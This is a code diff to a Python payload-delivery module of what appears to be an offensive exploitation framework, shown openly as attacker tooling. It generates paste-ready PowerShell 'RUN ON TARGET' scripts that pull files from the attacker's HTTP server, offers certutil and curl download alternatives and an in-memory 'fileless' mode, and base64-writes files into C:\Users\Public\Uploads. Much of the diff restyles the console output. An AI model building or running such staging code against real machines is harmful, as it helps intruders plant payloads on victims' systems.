@@ -5,7 +5,16 @@ import socket
 import socketserver
 import threading
 from pathlib import Path
+
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.text import Text
+from rich import box
+
 from core.attacker import resolve_lhost
+
+console = Console()
 
 # =========================================================
 # COLORS
@@ -20,10 +29,95 @@ W = '\033[0m'
 M = '\033[35m'
 W_BOLD = '\033[1m'
 
+#
+# Fixed, always-writable-by-default staging directory. Using a constant
+# path (instead of relative-to-CWD downloads) kills the whole class of
+# "where did the file actually land" bugs across every exploit module.
+#
+DEFAULT_REMOTE_DIR = r"C:\Users\Public\Uploads"
+
 # =========================================================
 # HELPERS
 # =========================================================
 
+def _human_size(num_bytes):
+
+    size = float(num_bytes)
+
+    for unit in ("B", "KB", "MB", "GB"):
+
+        if size < 1024:
+            return f"{size:.0f} {unit}" if unit == "B" else f"{size:.1f} {unit}"
+
+        size /= 1024
+
+    return f"{size:.1f} TB"
+
+
+def _manifest_table(files):
+
+    table = Table(
+        box=None,
+        show_header=True,
+        header_style="bold cyan",
+        pad_edge=False,
+        expand=False,
+    )
+
+    table.add_column("File", style="white")
+    table.add_column("Size", justify="right", style="white")
+
+    total = 0
+
+    for filepath in files:
+
+        size = Path(filepath).stat().st_size
+        total += size
+
+        table.add_row(Path(filepath).name, _human_size(size))
+
+    table.add_section()
+
+    table.add_row(
+        f"[bold cyan]{len(files)} file(s)[/bold cyan]",
+        f"[bold cyan]{_human_size(total)}[/bold cyan]",
+    )
+
+    return table
+
+
+def _print_script(lines, title):
+
+    #
+    # Deliberately no box here — a bordered panel means every line carries
+    # a leading "│", and a drag-select to copy straight off the terminal
+    # (no clipboard access, SSH session, etc.) would grab that too. A rule
+    # frames it without ever touching the actual command text.
+    #
+    console.print()
+    console.rule(f"[bold yellow]▸ {title}[/bold yellow]", style="yellow", align="left")
+    console.print()
+
+    for line in lines:
+        console.print(f"[bold yellow]{line}[/bold yellow]", soft_wrap=True, highlight=False)
+
+    console.print()
+
+
+def _print_alternatives(example):
+
+    console.rule("[dim]other delivery methods[/dim]", style="grey50", align="left")
+    console.print()
+
+    for label, key in (("certutil", "certutil"), ("curl", "curl")):
+
+        line = Text()
+        line.append(f"{label:<10}", style="dim cyan")
+        line.append(example[key], style="yellow")
+
+        console.print(line, soft_wrap=True, highlight=False)
+
+    console.print()
 
 
 def copy_clipboard(text):
@@ -103,7 +197,7 @@ def build_fileless_command(ip, port, filename):
     )
 
 
-def build_offline_command(filepath):
+def build_offline_command(filepath, remote_dir=None):
 
     data = Path(filepath).read_bytes()
 
@@ -111,10 +205,16 @@ def build_offline_command(filepath):
 
     filename = Path(filepath).name
 
+    dest = (
+        f"(Join-Path '{remote_dir}' '{filename}')"
+        if remote_dir else
+        f"(Join-Path (Get-Location).Path '{filename}')"
+    )
+
     return (
         f"$b64='{encoded}'; "
         f"[IO.File]::WriteAllBytes("
-        f"(Join-Path (Get-Location).Path '{filename}'), "
+        f"{dest}, "
         f"[Convert]::FromBase64String($b64)"
         f")"
     )
@@ -160,70 +260,82 @@ def mode_http(
     port,
     remote_dir=None,
 ):
-    print(f"\n{M}=== HTTP ==={W}\n")
+    console.print()
 
-    clipboard = []
+    console.print(
+        Panel(
+            _manifest_table(files),
+            title="[bold white]HTTP DELIVERY[/bold white]",
+            title_align="left",
+            border_style="cyan",
+            box=box.ROUNDED,
+            padding=(1, 2),
+        )
+    )
+
+    #
+    # Build the one paste-ready PowerShell script — mkdir, download each
+    # file, then cd into place so whatever comes next just works.
+    #
+    script_lines = []
+
+    if remote_dir:
+        script_lines.append(f'New-Item -ItemType Directory -Force -Path "{remote_dir}" | Out-Null')
+
+    per_file_cmds = {}
 
     for filepath in files:
 
         filename = Path(filepath).name
 
-        cmds = build_http_commands(
-            ip,
-            port,
-            filename,
-            remote_dir,
-        )
+        cmds = build_http_commands(ip, port, filename, remote_dir)
 
-        print(f"{C}{filename}{W}\n")
+        per_file_cmds[filename] = cmds
 
-        for name, cmd in cmds.items():
+        script_lines.append(cmds["iwr"])
 
-            print(f"{B}[{name}]{W}")
-            print(cmd)
-            print()
+    if remote_dir:
+        script_lines.append(f'cd "{remote_dir}"')
 
-        clipboard.append(cmds["iwr"])
+    _print_script(script_lines, "RUN ON TARGET — PowerShell")
 
-    copy_clipboard(
-        "\n".join(clipboard)
-    )
+    copy_clipboard("\n".join(script_lines))
 
-    print(f"{G}→ helpers copied to clipboard{W}")
+    console.print("[green]→ copied to clipboard[/green]")
+    console.print()
 
-    directory = Path(files[0]).parent
+    #
+    # Alternatives shown once (not per file) — same pattern, swap the URL/path
+    #
+    _print_alternatives(per_file_cmds[Path(files[0]).name])
 
-    print(
-        f"\n{Y}[*] Serving "
-        f"{len(files)} file(s) "
-        f"at http://{ip}:{port}/{W}"
-    )
+    console.print(f"[yellow][*] Serving {len(files)} file(s) at http://{ip}:{port}/[/yellow]", highlight=False)
 
-    return serve_http(directory, port)
+    return serve_http(Path(files[0]).parent, port)
 
 
 def mode_fileless(filepath, ip, port):
 
     filename = Path(filepath).name
+    size = _human_size(Path(filepath).stat().st_size)
 
-    cmd = build_fileless_command(
-        ip,
-        port,
-        filename
+    cmd = build_fileless_command(ip, port, filename)
+
+    console.print()
+    console.print(
+        f"[bold white]FILELESS DELIVERY[/bold white]  "
+        f"[dim]{filename} · {size} · nothing ever touches disk[/dim]",
+        highlight=False,
     )
 
-    print(f"\n{M}=== FILELESS ==={W}\n")
-
-    print(cmd)
+    _print_script([cmd], "RUN ON TARGET — PowerShell")
 
     copy_clipboard(cmd)
 
-    print(f"\n{G}→ helper copied to clipboard{W}")
+    console.print("[green]→ copied to clipboard[/green]")
+    console.print()
 
-    print(
-        f"\n{Y}[*] Serving {filename} "
-        f"at http://{ip}:{port}/{W}"
-    )
+    console.print(f"[yellow][*] Serving {filename} at http://{ip}:{port}/[/yellow]", highlight=False)
 
     return serve_http(
         Path(filepath).parent,
@@ -231,28 +343,37 @@ def mode_fileless(filepath, ip, port):
     )
 
 
-def mode_offline(files):
+def mode_offline(files, remote_dir=None):
 
-    print(f"\n{M}=== OFFLINE ==={W}\n")
+    console.print()
 
-    clipboard = []
-
-    for filepath in files:
-
-        cmd = build_offline_command(filepath)
-
-        print(f"{C}{Path(filepath).name}{W}\n")
-
-        print(cmd)
-        print()
-
-        clipboard.append(cmd)
-
-    copy_clipboard(
-        "\n\n".join(clipboard)
+    console.print(
+        Panel(
+            _manifest_table(files),
+            title="[bold white]OFFLINE DELIVERY[/bold white]",
+            title_align="left",
+            border_style="cyan",
+            box=box.ROUNDED,
+            padding=(1, 2),
+        )
     )
 
-    print(f"{G}→ helpers copied to clipboard{W}")
+    script_lines = []
+
+    if remote_dir:
+        script_lines.append(f'New-Item -ItemType Directory -Force -Path "{remote_dir}" | Out-Null')
+
+    for filepath in files:
+        script_lines.append(build_offline_command(filepath, remote_dir))
+
+    if remote_dir:
+        script_lines.append(f'cd "{remote_dir}"')
+
+    _print_script(script_lines, "RUN ON TARGET — PowerShell, one file at a time")
+
+    copy_clipboard("\n\n".join(script_lines))
+
+    console.print("[green]→ copied to clipboard[/green]")
 
 
 # =========================================================
@@ -261,15 +382,28 @@ def mode_offline(files):
 
 def choose_mode():
 
-    print(f"\n{W_BOLD}[*] WINDOWS FILE DELIVERY{W}")
+    table = Table(box=None, show_header=False, pad_edge=False, padding=(0, 2, 0, 0))
+    table.add_column(style="bold cyan", no_wrap=True)
+    table.add_column(style="white")
+    table.add_column(style="dim")
 
-    print(f"\n  {B}[1]{W} HTTP")
-    print(f"  {B}[2]{W} Fileless")
-    print(f"  {B}[3]{W} Offline Base64")
+    table.add_row("[1] HTTP", "web server", "fastest, needs a listener port")
+    table.add_row("[2] Fileless", "in-memory", "nothing ever touches disk")
+    table.add_row("[3] Offline", "base64 paste", "no network in/out at all")
 
-    print()
+    console.print()
+    console.print(
+        Panel(
+            table,
+            title="[bold white]WINDOWS FILE DELIVERY[/bold white]",
+            title_align="left",
+            border_style="blue",
+            box=box.ROUNDED,
+            padding=(1, 2),
+        )
+    )
 
-    choice = input(f"{B}select{W}> ").strip()
+    choice = input(f"\n{B}select> {W}").strip()
 
     mapping = {
         "1": "http",
@@ -292,6 +426,9 @@ def stage_windows_files(
     port=8080,
     remote_dir=None,
 ):
+
+    if remote_dir is None:
+        remote_dir = DEFAULT_REMOTE_DIR
 
     files = [
         Path(f).resolve()
@@ -369,7 +506,7 @@ def stage_windows_files(
 
     elif method == "offline":
 
-        mode_offline(files)
+        mode_offline(files, remote_dir)
 
 
 # =========================================================
